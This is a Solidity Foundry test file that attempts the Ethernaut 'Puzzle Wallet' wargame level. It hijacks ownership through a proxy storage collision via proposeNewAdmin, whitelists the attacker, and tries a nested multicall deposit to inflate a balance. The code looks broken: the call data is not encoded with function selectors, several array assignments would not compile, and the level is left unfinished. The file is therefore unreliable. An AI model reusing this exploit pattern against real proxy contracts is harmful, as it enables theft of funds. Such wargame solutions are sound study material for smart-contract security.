pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../PuzzleWallet/PuzzleWalletFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract PuzzleWalletTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    address eoaAddress = address(100);

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testPuzzleWalletHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PuzzleWalletFactory puzzleWalletFactory = new PuzzleWalletFactory();
        (address levelAddressProxy, address levelAddressWallet) = puzzleWalletFactory.createInstance{value: 1 ether}();
        PuzzleProxy ethernautPuzzleProxy = PuzzleProxy(payable(levelAddressProxy));
        PuzzleWallet ethernautPuzzleWallet = PuzzleWallet(payable(levelAddressWallet));
        
        vm.startPrank(eoaAddress);
        
        

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        emit log_address(ethernautPuzzleProxy.admin());
        emit log_address(ethernautPuzzleWallet.owner());

        ethernautPuzzleProxy.proposeNewAdmin(eoaAddress);
        emit log_address(ethernautPuzzleWallet.owner());

        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));
        ethernautPuzzleWallet.addToWhitelist(eoaAddress);
        emit IsTrue(ethernautPuzzleWallet.whitelisted(eoaAddress));

        bytes memory data1 = abi.encode("deposit");
        bytes memory data2 = abi.encode("multicall", [[data1]]);

        bytes[] memory data3 = [data1, data2];


        ethernautPuzzleWallet.multicall{value: 1 ether}(data3);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        // assert(levelSuccessfullyPassed);
    }
}